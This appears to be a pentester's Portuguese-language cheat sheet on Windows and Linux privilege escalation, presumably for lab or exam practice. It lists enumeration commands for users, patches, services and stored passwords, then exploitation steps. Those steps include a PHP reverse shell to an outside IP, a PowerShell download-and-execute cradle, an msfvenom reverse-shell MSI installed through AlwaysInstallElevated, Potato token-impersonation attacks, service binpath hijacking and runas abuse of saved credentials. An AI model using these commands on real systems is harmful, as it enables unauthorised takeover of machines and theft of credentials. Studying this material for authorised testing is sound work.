Escalacao de privilegio
======================

# Enumeração

Principais formas de escalação de privilégio nas máquinas são:

1) serviços mal configurados
2) permissões insuficientes de arquivos binários ou serviços
3) arquivos com informações sensíveis armazenados localmente
    4) Inclusive dentro de máquinas virtuais
4) Configurações de registro que sempre elevam privilégio antes de executar um binário
5) Scripts de instalação contendo credenciais

Bypass do UAC com o usuario quando esta no grupo Administrators  
Permissão de escrita na pasta tasks (tentativa de criar serviços)

## Windows

Primeiro passo a ser considerado para escalação de privilégio é obter o máximo de informação possível a respeito do alvo:

### Usuário ao qual estamos acessando a maquina

    whoami / all
    net user username
    net user /domain

### Demais usuarios da maquina
ip
    net user
    
### Hostname

    hostname

### Informações a respeito do sistema

    systeminfo
ou
  
    systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

    #Obter hotfixes
    wmic qfe
    
    #Obter informações a respeito dos discos associadas ao host
    wmic logicaldisk get caption

### Enumeração de processos e softwares
    
    tasklist /svc
    tasklist
    
    tasklist /v /fi "username eq system"
    
    Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
    Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
    
    
### Network information

A presença de interfaces virtuais pode aferir a ideia de existir máquinas virtuais na máquina ou de anti vírus instalado.

    ipconfig /all
    route print
    netstat -ano #(process ID como -o, requer privilégios administrativos)
    netstat -anb #(nome do binário com o -b, requer privilégios administrativos)
    
### firwewall rules enumeration

    netsh advfirewall show currentprofile
    
    netsh advfirewall firewall show rule name=all
    
### scheduled tasks


    schtasks /query /fo LIST /v
    
### Patches

    wmic product get name, version, vendor
    
    wmic qfe get Caption, Description, HotFixID, InstalledOn
    
    
    reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

### Checking for unmounted disks

    mountvol

Depois dee enumerar, eh interessante montarmos o volume pra verificar se temos algo.

    mountvol G: \\?\Volume{ff136f5c-4935-11e9-80b5-806e6f6e6963}\
    
### Unquoted Service Paths

    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
    
### PasswordEnumeration

    findstr /si password *.doc *.txt *.ini *.config
    
    gci -recurse -filter passwd*
    
    dir /s *pass* == *cred* == *ssh* == *.config*
    
    reg query HKLM /f *password* /t REG_SZ /s
    
    reg query HKLM /f teamviewer /t REG_SZ /s
    
    reg query HKCU /f password /t REG_SZ /s
    
    
    Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
    
    driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
    
    Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName,DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
    
### Autologon

    	
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

    reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7 /v SecurityPasswordAES

    (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName   
    
    (Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword   


### Windows Exploit Suggester

    pip install wesng
    
    sudo ln -s /home/acosta/.local/bin/wes /usr/bin/wes
    
    wes --update
    
    wes si.txt



## Linux

### Usuário ao qual estamos acessando a maquina

    id

### CheckHomeDirectory

    ls -al ~
    or
    
       cd ~
       ls -al

### CheckHistory

    history
    
### Demais usuários na máquina

    cat /etc/passwd

### Hostname

    hostname
    
### Informações a respeito do sistema

    cat /etc/issue
    
    cat /etc/*-release
    
    uname -a
  
    cat /proc/version
  
### Enumeração de processos

    ps axu
    
### Network information

    ip a
    ifconfig
    route
    routel
    ip route
    
    netstat -napl
    netstat -naptl
    
    ss -anp

### SensitiveFileContent

    grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
    
    
Nesse caso e interessante considerar que o diretorio que busco as informacoes e um diretorio de configuracoes de aplicacoes '/etc':

    grep --color=auto -rnw '/etc' -ie "PASSWORD" --color=always 2> /dev/null
    

### Enumerate SUID files

Com isso podemos executar o arquivo (caso seja um executável) conforme a permissão do dono do arquivo. Ou seja, se o dono do arquivo for root e o SUID bit estiver definido para o binário, podemos realizar a escalação de privilégio.

    find / -perm -u=s -type f 2>/dev/null
    find / -name proof.txt
    find C:/ -name proof.txt
    
    /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-i']);"
    
    php -r '$sock=fsockopen("192.168.49.120",81);exec("/bin/sh -i <&3 >&3 2>&3");'
    
    /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"

# Exploitation

## Windows 

### Potatoes

    whoami /priv

    SeImpersonate
    
    PrintSpoofer32.exe -i -c powershell
    
    JuicyPotato.exe -t * -p shell.bat -l 4444
    
    ./jp.exe -t * -p  c:\temp\s.bat

Esse juicyPotato que funcionou é o que se encontra neste link:

https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip

Exemplo:

![qownnotes-media-izYysB](../../media/qownnotes-media-izYysB.png)


### Com credencial

    $password = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential('Administrator', $password)
    Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.5:8000/shell2.ps1')" -Credential $cred

Para obter essa shell, claro temos que subir os handlers
    
    python -m http.server
    nc -nlvp 8082

### PowerUp

Normalmente eu tenho problemas para importar o module de powershell powerup, então eu uso a seguinte alternativa:

    (new-object net.webclient).downloadfile('http://<hostname>/PowerUp.ps1', 'c:\temp\pu.ps1')
    . ./pu.ps1
    invoke-allchecks

caso contrário:

    import-module PowerUp.ps1

    invoke-allchecks
     


#### Weak service permissions

![qownnotes-media-jCADRm](../../media/qownnotes-media-jCADRm.png)

![qownnotes-media-Yhpwrk](../../media/qownnotes-media-Yhpwrk.png)

    ./accesschk.exe -ucwqv UsoSvc /accepteula
    
    ./accesschk.exe -ucwqv <servicename> /accepteula
    
Com esse comando, verificamos que estamos no grupo NTAUTHORITY/SERVICE
    
    whoami /all

![qownnotes-media-zdSaRr](../../media/qownnotes-media-zdSaRr.png)

    sc.exe config usosvc binpath="C:\temp\revshell.exe"

![qownnotes-media-QfiKZv](../../media/qownnotes-media-QfiKZv.png)

    net stop usosvc
    net start usosvc
 
 
##### AlwaysInstallElevated

![qownnotes-media-OcpDzT](../../media/qownnotes-media-OcpDzT.png)

    msfvenom -p windows/shell_reverse_tcp -f msi LHOST=10.10.14.5 LPORT=8084 > shell.msi
    
    copy \\10.10.14.5\smb\shell.msi shell.msi
    msiexec /quiet /qn /i shell.msi

![qownnotes-media-xGOiSx](../../media/qownnotes-media-xGOiSx.png)

### Runas

    cmdkey /list
    runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
    runas /savecred /user:Administrator "cmd.exe /k whoami"
    
### Unquoted Service Paths

    gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name

    